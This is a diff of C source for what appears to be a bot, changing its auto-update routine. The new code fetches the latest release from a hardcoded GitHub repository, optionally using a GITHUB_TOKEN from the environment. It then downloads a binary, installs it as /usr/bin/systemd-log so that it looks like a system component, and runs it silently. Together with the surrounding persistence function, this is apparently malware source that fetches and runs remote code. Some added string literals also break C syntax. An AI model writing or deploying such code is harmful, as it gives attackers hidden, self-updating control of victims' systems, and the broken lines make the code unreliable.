@@ -881,26 +881,40 @@ static void install_persistence(const char *path) {
 
 /* ── GitHub Auto-Update ────────────────────────── */
 static void check_updates(const char *ver) {
-    FILE *p = popen(
-        "curl -s 'https://api.github.com/repos/YOUR_ORG/bot/releases/latest' 2>/dev/null | "
-        "grep tag_name | head -1 | cut -d'\"' -f4", "r");
+    const char *token = getenv("GITHUB_TOKEN");
+    char cmd[1024];
+    if (token)
+        snprintf(cmd, sizeof(cmd),
+            "curl -s -H 'Authorization: token %s' 'https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest' 2>/dev/null"
+            " | grep tag_name | head -1 | cut -d'"' -f4", token);
+    else
+        snprintf(cmd, sizeof(cmd),
+            "curl -s 'https://api.github.com/repos/duaakcon10/dc-ansta/releases/latest' 2>/dev/null"
+            " | grep tag_name | head -1 | cut -d'"' -f4");
+    FILE *p = popen(cmd, "r");
     if (!p) return;
     char latest[64] = {0};
     fread(latest, 1, sizeof(latest) - 1, p);
     pclose(p);
     latest[strcspn(latest, "\n")] = 0;
     if (latest[0] && strcmp(latest, ver) != 0) {
-        char cmd[512];
-        snprintf(cmd, sizeof(cmd),
-            "curl -sL 'https://github.com/YOUR_ORG/bot/releases/download/%s/bot_static' "
-            "-o /tmp/bot_update && chmod +x /tmp/bot_update && "
-            "mv /tmp/bot_update /usr/bin/systemd-log && /usr/bin/systemd-log &",
-            latest);
+        token = getenv("GITHUB_TOKEN");
+        if (token)
+            snprintf(cmd, sizeof(cmd),
+                "curl -sL -H 'Authorization: token %s' 'https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static'"
+                " -o /tmp/bot_update && chmod +x /tmp/bot_update &&"
+                " mv /tmp/bot_update /usr/bin/systemd-log && /usr/bin/systemd-log &",
+                token, latest);
+        else
+            snprintf(cmd, sizeof(cmd),
+                "curl -sL 'https://github.com/duaakcon10/dc-ansta/releases/download/%s/bot_static'"
+                " -o /tmp/bot_update && chmod +x /tmp/bot_update &&"
+                " mv /tmp/bot_update /usr/bin/systemd-log && /usr/bin/systemd-log &",
+                latest);
         system(cmd);
         exit(0);
     }
 }
-
 /* ================================================================
  * MAIN
  * ================================================================ */
